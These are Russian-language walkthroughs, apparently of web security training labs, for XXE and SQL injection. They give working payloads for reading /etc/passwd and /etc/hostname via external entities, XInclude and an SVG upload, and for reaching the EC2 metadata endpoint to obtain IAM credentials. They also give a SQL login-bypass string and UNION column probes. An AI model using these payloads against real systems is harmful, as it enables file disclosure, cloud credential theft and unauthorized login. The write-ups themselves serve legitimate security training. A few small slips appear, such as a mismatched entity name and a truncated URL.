# XXE

## Lab: Exploiting XXE using external entities to retrieve files

После поверхностной инспекции содержимого сайта, можно заметить форму stockCheckForm, расположенную внизу страницы конкретного продукта, например /product?productId=1. Отправка этой формы инициирует передачу данных в XML формате, что ввиду некорректной проверки содержимого приводит к уязвимости, эксплуатация которой возможна при при создании сущности <br>
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```
<br>
и ее вызове &res; в скрытом параметре productId.
____

## Lab: Exploiting XXE using external entities to retrieve files

В описании задания сказано, что необходимо получить "IAM secret access key from the EC2 metadata endpoint". Путем чтения доков ПО EC2, [обнаруживаем](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html), что для роли admin указанное выше можно получить по пути <br>
```url
/latest/meta-data/iam/security-credentials/
```
доступном на 80 порту
169.254.169.254.<br>
После мы эксплуатируем SSRF, отправляя аналогично предыдущему заданию запрос с XXE
```xml
<!DOCTYPE foo [ <!ENTITY res SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]> 
```
и добавляя вызов сущности в productId.
____

## Lab: Exploiting XInclude to retrieve files

Отправляя checkstock, добавляем в productId

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"> 
<xi:include parse="text" href="file:///etc/passwd"/></foo> 
```
____


## Lab: Exploiting XXE via image file upload
Замечаем возможность добавлять комментарии под постами и прикреплять к комментариям изображение. <br>
Загражаем файл 1.svg со следующим содержимым:
```xml

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```
На картинке рядом с нашим комментарием появляется hostname.

____

# SQL

## Lab: SQL injection vulnerability allowing login bypass

Манипуляции с productId не дают положительных результатов, так как, по видимому, значение данного параметра экранируется. Замечаем форму логина. В поле Username вводим:
```
administrator' or '1'='1 --
```
и произвольную последовательность символов длины 1 в поле password, так как 
### ***"Please fill out this field!"***.
____

## Lab: SQL injection UNION attack, finding a column containing text

Выбрав категорию ```'+or+1=1--```, замечаем, что нам отобразились все продукты, что говорит о наличии уязвимости SQLi.<br>
Определяем количество столбцов возвращаемых основным запросом:
```
/filter?category='+union+select+NULL+--
/filter?category='+union+select+NULL,NULL+--
/filter?category='+union+select+NULL,NULL,NULL+--
...
```
Оказывается, их 3. Предпологается, что первый столбец содержит (это распространенная практика) цифровой уникальный идентификатор id продукта, поэтому, так как в лабораторке от нас требуется возвращение SQL-запросов конкретной строки, вписываем на место второго столбца ___%uniquestrng%___, написанную под __'Back to lab home'__.
Получается запрос
```
ilter?category='+union+select+NULL,'0qOP0A',NULL+--
```
